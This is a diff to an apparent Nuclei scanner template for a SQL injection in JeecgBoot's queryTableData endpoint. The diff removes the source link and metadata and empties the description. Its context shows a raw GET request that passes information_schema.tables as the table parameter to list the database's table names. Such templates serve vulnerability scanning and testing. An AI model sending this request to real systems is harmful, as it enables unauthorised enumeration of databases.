@@ -3,12 +3,8 @@ info:
   name: jeecg-boot-queryTableData-sqli
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ae37uq396xf312k0'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ae37uq396xf312k0
-    fofa: 暂无
 http:
 - raw:
   - 'GET /jeecg-boot/sys/dict/queryTableData?pageSize=100&table=information_schema.tables&text=table_name&code=TABLE_SCHEMA HTTP/1.1
